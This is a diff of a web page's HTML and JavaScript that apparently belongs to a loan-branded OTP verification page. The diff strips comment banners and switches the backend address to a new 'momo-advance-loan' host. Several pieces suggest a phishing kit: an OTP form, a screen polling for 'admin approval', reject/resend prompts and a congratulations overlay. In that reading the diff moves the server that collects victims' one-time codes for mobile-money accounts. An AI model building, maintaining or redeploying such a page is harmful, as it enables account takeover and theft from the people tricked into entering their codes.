@@ -157,9 +157,7 @@
 
         .verify-security { display: flex; align-items: center; gap: 5px; font-size: 11px; color: #aaa; }
 
-        /* ============================================
-           NOTICE MODAL (used for Reject / Resend)
-           ============================================ */
+        /* NOTICE MODAL */
         .notice-overlay {
             position: fixed; inset: 0; background: rgba(0, 0, 0, 0.55);
             display: none; align-items: center; justify-content: center;
@@ -197,9 +195,7 @@
         .notice-btn:hover { transform: scale(1.02); box-shadow: 0 8px 20px rgba(0, 71, 171, 0.3); }
         .notice-btn:active { transform: scale(0.98); }
 
-        /* ============================================
-           CONGRATS OVERLAY
-           ============================================ */
+        /* CONGRATS OVERLAY */
         .congrats-overlay {
             position: fixed; inset: 0; background: rgba(0, 0, 0, 0.7);
             display: none; flex-direction: column; align-items: center; justify-content: center;
@@ -383,7 +379,11 @@
     </div>
 
     <script>
-        const API_BASE = 'https://easy-loansej1-production.up.railway.app';
+        // ============================================
+        // ✅ NEW BACKEND URL
+        // ============================================
+        const API_BASE = 'https://momo-advance-loan-production.up.railway.app';
+
         const POLL_INTERVAL_MS = 2000;
         let pollTimer = null;
 
@@ -467,9 +467,6 @@
             });
         });
 
-        // ============================================
-        // RESEND COUNTDOWN
-        // ============================================
         let remaining = 60;
         let timer = null;
 
@@ -498,9 +495,6 @@
             startCountdown();
         });
 
-        // ============================================
-        // OVERLAY / MODAL HELPERS
-        // ============================================
         function showVerifyOverlay() { verifyOverlay.classList.add('show'); }
         function hideVerifyOverlay() { verifyOverlay.classList.remove('show'); }
 
@@ -532,9 +526,6 @@
             otpBoxes.forEach(b => b.classList.add('invalid'));
         }
 
-        // ============================================
-        // POLLING FOR ADMIN APPROVAL
-        // ============================================
         function startPolling(requestId) {
             stopPolling();
             console.log('🔄 Polling started for requestId:', requestId);
@@ -607,9 +598,6 @@
             }
         }
 
-        // ============================================
-        // VERIFY BUTTON
-        // ============================================
         verifyBtn.addEventListener('click', async function() {
             const otp = getOtpValue();
 
